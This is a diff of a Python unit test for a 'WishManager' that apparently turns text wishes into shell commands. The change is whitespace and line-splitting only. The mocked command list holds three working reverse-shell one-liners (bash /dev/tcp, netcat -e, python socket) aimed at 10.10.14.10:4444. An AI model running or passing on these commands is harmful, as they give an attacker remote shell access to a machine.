@@ -92,7 +92,7 @@ class TestWishManager:
         """Test that generate_commands returns the expected commands based on the wish text."""
         settings = Settings()
         manager = WishManager(settings)
-        
+
         # Mock the generate_commands method
         def mock_generate_commands(wish_text):
             wish_text = wish_text.lower()
@@ -107,7 +107,9 @@ class TestWishManager:
                 return [
                     "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'",
                     "nc -e /bin/bash 10.10.14.10 4444",
-                    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
+                    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+                    "s.connect((\"10.10.14.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
+                    "os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
                 ]
             else:
                 return [
@@ -115,7 +117,7 @@ class TestWishManager:
                     f"echo 'Processing {wish_text}' && ls -la",
                     "sleep 5"
                 ]
-        
+
         # Replace the generate_commands method with our mock
         manager.generate_commands = mock_generate_commands
 
